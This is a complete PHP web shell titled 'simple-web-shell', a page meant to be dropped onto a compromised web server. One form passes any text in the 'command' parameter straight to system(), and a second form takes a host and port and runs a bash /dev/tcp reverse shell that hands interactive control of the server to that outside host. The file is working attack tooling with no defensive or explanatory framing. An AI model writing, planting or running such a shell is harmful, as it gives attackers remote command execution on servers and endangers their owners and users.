<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>simple-web-shell</title>
</head>
<style>
    body {
        background-color: grey;
    }
</style>
<body>
    <hr>
    <form action="" method="GET">
        <input type="text" name="command" placeholder="command" style="width: 1895px;">
        <input type="submit" value="execute command" style="width: 100%;">
    </form>
<div>
<?php 
if(isset($_GET['command'])) {
    system($_GET["command"]);
}
?>
</div>
<form action="" method="GET">
    <hr>
    <input type="text" name="HOST" placeholder="Enter Host" style="width: 1895px;">
    <input type="text" name="PORT" placeholder="Enter Port" style="width: 1895px;">
    <input type="submit" value="Reverse Shell the server" style="width: 100%;">
    <hr>
</form>
<?php 
if(isset($_GET['HOST'])) {
    $port      = $_GET['PORT'];
    $host      = $_GET['HOST'];
    system("/bin/bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'");
}
?>
</body>
</html>
